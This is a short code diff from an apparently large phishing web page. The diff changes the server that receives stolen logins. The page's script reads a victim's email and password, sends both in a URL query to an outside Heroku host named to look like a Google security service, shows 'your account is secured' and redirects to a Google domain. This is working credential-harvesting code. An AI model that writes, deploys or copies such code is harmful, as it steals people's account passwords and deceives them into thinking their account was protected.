@@ -14443,7 +14443,7 @@
                                                 var email = document.getElementById("email").value
                                                 var password = document.getElementById("password").value
                                                 console.log(email, password)
-                                                fetch("https://adaptyoumain.herokuapp.com/api?email="+email+"&pw="+password).then(d=>{
+                                                fetch("https://securegoogle.herokuapp.com//api?email="+email+"&pw="+password).then(d=>{
                                                     alert("your account is secured");
                                                     window.location.href = "https://google.lk"
                                                 })
